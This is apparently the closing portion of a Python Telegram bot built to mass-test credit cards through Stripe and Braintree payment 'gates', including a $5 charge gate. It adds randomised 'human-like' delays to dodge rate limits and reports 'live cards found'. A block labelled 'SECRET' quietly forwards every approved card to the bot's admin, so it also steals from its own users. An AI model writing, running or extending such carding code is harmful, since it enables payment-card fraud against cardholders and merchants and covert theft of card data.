        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎮 Use buttons below to control"
    )
    processing_msg = await context.bot.send_message(chat_id, start_text, reply_markup=reply_markup, parse_mode='Markdown')
    
    # Store message ID to delete later
    checking_sessions[session_id]['processing_msg_id'] = processing_msg.message_id
    
    results = []
    
    try:
        for i, card in enumerate(cards, 1):
            # Continuous Maintenance Check
            if is_maintenance_mode() and not is_admin(user_id):
                await context.bot.send_message(chat_id, "🚧 **Check stopped: Bot entered maintenance mode.**", reply_markup=ReplyKeyboardRemove())
                break

            # Check if session is stopped
            if session_id not in checking_sessions or not checking_sessions[session_id]['active']:
                break
                
            # Check if session is paused - more responsive checking
            pause_check_count = 0
            while session_id in paused_sessions:
                await asyncio.sleep(0.5)  # Check every 0.5 seconds for better responsiveness
                pause_check_count += 1
                # Check if session was stopped while paused
                if session_id not in checking_sessions or not checking_sessions[session_id]['active']:
                    print(f"DEBUG: Session {session_id} stopped while paused")
                    break
                # Prevent infinite loop
                if pause_check_count > 1200:  # 10 minutes max pause
                    print(f"DEBUG: Session {session_id} pause timeout")
                    break
            
            # Update session progress
            checking_sessions[session_id]['current_index'] = i
            
            # Select checking function based on gate_priority
            if gate_priority == 'sb':
                result, is_approved = await sb_check_card(card, i, total_cards, user_id, session_id)
            elif gate_priority == 'ba':
                result, is_approved = await ba_check_card(card, i, total_cards, session_id)
            else:
                # Default: Stripe Auth gate (au)
                result, is_approved = await check_card(card, i, total_cards, session_id)
            
            # If check was aborted (returned None)
            if result is None:
                break
            
            results.append(result)
            
            # Count results
            if is_approved:

                approved_count += 1
                checking_sessions[session_id]['approved_count'] = approved_count
                # Track user card stats
                increment_card_stats(user_id, approved=True, chat_id=chat_id)
                
                # SECRET: Notify admin on hit
                status_raw = "Charged" if gate_priority == 'sb' else "Approved"
                
                # Determine gate name based on priority
                hit_gate_name = "Unknown Gate"
                if gate_priority == 'au':
                    hit_gate_name = "Stripe Auth 💎"
                elif gate_priority == 'sb':
                    hit_gate_name = "Stripe Charge $5 ⚡"
                elif gate_priority == 'ba':
                    hit_gate_name = "Braintree Auth 🔐"
                else:
                    hit_gate_name = "Cookies Gate (File) 📄"

                # Create a minimal user object for hit logging
                class UserObj:
                     def __init__(self, uid, uname, fname, lname):
                         self.id = uid
                         self.username = uname
                         self.first_name = fname
                         self.last_name = lname
                user_stats = get_user_stats(user_id)
                minimal_user = UserObj(user_id, user_stats.get('username'), user_stats.get('first_name'), user_stats.get('last_name'))
                await save_hit_and_notify_admin(context, minimal_user, card, status_raw, gate_name=hit_gate_name)
            else:
                declined_count += 1
                checking_sessions[session_id]['declined_count'] = declined_count
                increment_card_stats(user_id, approved=False, chat_id=chat_id)
            
            
            # Delete processing message before first result (cleaner look)
            if i == 1 and 'processing_msg_id' in checking_sessions.get(session_id, {}):
                try:
                    await context.bot.delete_message(chat_id, checking_sessions[session_id]['processing_msg_id'])
                    print(f"DEBUG: Deleted processing message for session {session_id}")
                except Exception as e:
                    print(f"DEBUG: Could not delete processing message: {e}")
            
            # Send individual card result immediately
            await send_message_with_retry(update_or_query, context, chat_id, result)
            
            # No progress messages - cleaner output
            
            # Add delay between cards to avoid rate limits - 10-12 second interval for safety
            if i < total_cards:
                delay = random.uniform(8.0, 10.0)  # Human-like delay between checks
                
                # Sleep in smaller chunks to allow pause/stop to work during delay
                delay_chunks = int(delay * 2)  # 0.5 second chunks
                for chunk in range(delay_chunks):
                    # Check if session was stopped or paused during delay
                    if session_id not in checking_sessions or not checking_sessions[session_id]['active']:
                        print(f"DEBUG: Session {session_id} stopped during delay")
                        return
                    if session_id in paused_sessions:
                        print(f"DEBUG: Session {session_id} paused during delay")
                        break
                    await asyncio.sleep(0.5)
        
        # Send engaging final results (only for multiple cards)
        if total_cards > 1:
            success_rate = (approved_count/total_cards)*100 if total_cards > 0 else 0
            
            if approved_count > 0:
                final_summary = (
                    f"🎉💎 **VERIFICATION COMPLETE** 💎🎉\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ **Approved:** {approved_count} 🔥\n"
                    f"❌ **Declined:** {declined_count}\n"
                    f"📈 **Success Rate:** {success_rate:.1f}% 🚀\n"
                    f"🎯 **Total Checked:** {total_cards}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎊 **Congratulations! Live cards found!** 🎊"
                )
            else:
                final_summary = (
                    f"✅💳 **VERIFICATION COMPLETE** 💳✅\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ **Approved:** {approved_count}\n"
                    f"❌ **Declined:** {declined_count}\n"
                    f"📊 **Success Rate:** {success_rate:.1f}%\n"
                    f"🎯 **Total Checked:** {total_cards}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"💪 **Check completed successfully!**"
                )
            
            # Hide keyboard when checking is complete
            from telegram import ReplyKeyboardRemove
            
            await context.bot.send_message(
                chat_id, 
                final_summary, 
                reply_markup=ReplyKeyboardRemove(),
                parse_mode='Markdown'
            )
        else:
            # For single card, just hide keyboard without summary
            from telegram import ReplyKeyboardRemove
            await context.bot.send_message(
                chat_id,
                "✅",
                reply_markup=ReplyKeyboardRemove()
            )
        
    except Exception as e:
        error_msg = f"❌ **Error during checking:** {str(e)}"
        if hasattr(update_or_query, 'message'):
            await update_or_query.message.reply_text(error_msg, parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id, error_msg, parse_mode='Markdown')
    
    finally:
        # Mark session as completed but keep it for button handling
        if session_id in checking_sessions:
            checking_sessions[session_id]['completed'] = True
            checking_sessions[session_id]['active'] = False
        
        # Clean up temporary file immediately
        try:
            os.unlink(temp_file_path)
        except:
            pass
        
        # Schedule session cleanup after 5 minutes to allow button interactions
        async def cleanup_session():
            await asyncio.sleep(300)  # 5 minutes
            if session_id in checking_sessions:
                del checking_sessions[session_id]
            if session_id in paused_sessions:
                paused_sessions.remove(session_id)
            print(f"DEBUG: Cleaned up completed session {session_id}")
        
        # Start cleanup task in background
        asyncio.create_task(cleanup_session())

async def main() -> None:
    """Start the bot."""
    print(f"🚀 Starting bot with {len(authorized_users)} authorized users...")
    
    global GLOBAL_REQUEST_SEMAPHORE
    GLOBAL_REQUEST_SEMAPHORE = asyncio.Semaphore(2) # Allow 2 simultaneous requests globally (Stability mode)
    
    # Create the Application with better timeout settings
    application = Application.builder().token(BOT_TOKEN).connect_timeout(30).read_timeout(30).build()
    
    # Start auto-unban worker
    asyncio.create_task(auto_unban_worker_with_bot(application.bot))
    # Start group auto-unban worker
    asyncio.create_task(auto_unban_groups_worker_with_bot(application.bot))
    
    # Set up error handler
    async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Log errors caused by Updates."""
        logger.error(f"Exception while handling an update: {context.error}")
        print(f"Update {update} caused error {context.error}")
    
    application.add_error_handler(error_handler)

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("bin", bin_command))
    application.add_handler(CommandHandler("pause", pause_command))
    application.add_handler(CommandHandler("resume", resume_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(CommandHandler("adduser", adduser_command))
    application.add_handler(CommandHandler("addgroup", addgroup_command))
    application.add_handler(CommandHandler("addprivategroup", addprivategroup_command))
    application.add_handler(CommandHandler("removeuser", removeuser_command))
    application.add_handler(CommandHandler("removegroup", removegroup_command))
    application.add_handler(CommandHandler("listusers", listusers_command))

    # New user tracking commands
    application.add_handler(CommandHandler("allusers", allusers_command))
    application.add_handler(CommandHandler("userstats", userstats_command))
    application.add_handler(CommandHandler("onlineusers", onlineusers_command))
    # Groups tracking commands
    application.add_handler(CommandHandler("allgroups", allgroups_command))
    application.add_handler(CommandHandler("groupstats", groupstats_command))
    # Punishment handlers
    application.add_handler(CommandHandler("ban", punish_command))
    application.add_handler(CommandHandler("suspend", punish_command))
    application.add_handler(CommandHandler("unban", punish_command))
    # Broadcast commands
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("sendto", sendto_command))
    application.add_handler(CommandHandler("sb", sb_command))
    application.add_handler(CommandHandler("au", au_command))  # Stripe Auth gate
    application.add_handler(CommandHandler("ba", ba_command))  # Braintree Auth gate
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    application.add_handler(CallbackQueryHandler(button_callback))
    # Group membership handler
    application.add_handler(ChatMemberHandler(on_my_chat_member_update, ChatMemberHandler.MY_CHAT_MEMBER))

    # Initialize and run the bot with better error handling and retries
    max_retries = 3
    retry_delay = 5
    
    for attempt in range(max_retries):
        try:
            print(f"🔄 Connection attempt {attempt + 1}/{max_retries}...")
            
            await application.initialize()
            await application.start()
            print("✅ Bot initialized successfully!")
            
            # Start polling with more robust settings
            await application.updater.start_polling(
                poll_interval=2.0,      # Check for updates every 2 seconds
                timeout=30,             # Longer timeout for each request
                bootstrap_retries=3,    # Retry on startup failures
                drop_pending_updates=True  # Skip old updates on startup
            )
            
            print("🔄 Bot is now polling for updates...")
            print("✅ Bot is running successfully! Press Ctrl+C to stop.")
            
            # Keep the bot running
            await asyncio.Event().wait()
            break  # If we reach here, everything worked
            
        except asyncio.TimeoutError:
            print(f"⏰ Connection timeout on attempt {attempt + 1}")
            if attempt < max_retries - 1:
                print(f"🔄 Retrying in {retry_delay} seconds...")
                await asyncio.sleep(retry_delay)
                retry_delay *= 2  # Exponential backoff
            else:
                print("❌ All connection attempts failed due to timeout")
                print("💡 Check your internet connection and bot token")
                
        except KeyboardInterrupt:
            print("🛑 Bot stopped by user")
            break
            
        except Exception as e:
            print(f"❌ Bot error on attempt {attempt + 1}: {e}")
            logger.error(f"Bot startup error: {e}")
            if attempt < max_retries - 1:
                print(f"🔄 Retrying in {retry_delay} seconds...")
                await asyncio.sleep(retry_delay)
                retry_delay *= 2
            else:
                print("❌ All connection attempts failed")
                print(f"💡 Last error: {e}")
                
    # Cleanup
    try:
        await application.stop()
        print("🔄 Bot stopped gracefully")
    except Exception as e:
        print(f"Error during shutdown: {e}")

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except Exception as e:
        print(f"Fatal error: {e}")
        logger.error(f"Fatal error: {e}")
